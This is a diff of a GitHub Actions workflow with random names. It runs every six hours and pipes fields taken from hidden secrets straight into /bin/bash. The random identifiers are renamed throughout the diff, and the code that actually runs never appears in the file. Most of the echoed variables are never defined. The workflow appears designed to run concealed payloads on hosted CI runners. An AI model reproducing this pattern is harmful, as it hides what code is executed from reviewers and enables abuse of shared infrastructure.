@@ -1,25 +1,27 @@
 name: stoodpoliteness
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 3/6 * * *'
-jobs:  # 32075
+    - cron: '24 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: stoodpoliteness
         env:
-          ehui48806: ${{ secrets.ehui48806 }}
+          hayz1288: ${{ secrets.hayz1288 }}
         run: |
-          echo $ehui48806 | jq -r .rg00882 | /bin/bash
-          echo $x57837 | jq -r .fykxq66 | /bin/bash
-          echo $fcowo74030 | jq -r .u679 | /bin/bash
-          echo $sdqtl71 | jq -r .ar6745 | /bin/bash
-          echo $mzudl7877 | jq -r .hxt560 | /bin/bash
-          echo $om8 | jq -r .g5102 | /bin/bash
-          echo $lbhah7 | jq -r .t7211 | /bin/bash
-          echo $jad30438 | jq -r .ffqpx195 | /bin/bash
-          echo $cl7 | jq -r .ksx6 | /bin/bash
+          echo $hayz1288 | jq -r .da316 | /bin/bash
+          echo $dylpb0364 | jq -r .vr9420 | /bin/bash
+          echo $y7593 | jq -r .kpw944 | /bin/bash
+          echo $tdh362 | jq -r .siwen34 | /bin/bash
+          echo $pzrk9 | jq -r .lcg786 | /bin/bash
+          echo $qlig0 | jq -r .hb3 | /bin/bash
+          echo $aqs3683 | jq -r .qljfw921 | /bin/bash
+          echo $klvu465 | jq -r .aaatf35 | /bin/bash
+          echo $w3 | jq -r .ll9 | /bin/bash
+          echo $bn64823 | jq -r .oc389 | /bin/bash
+          echo $scu6115 | jq -r .auev12895 | /bin/bash
 
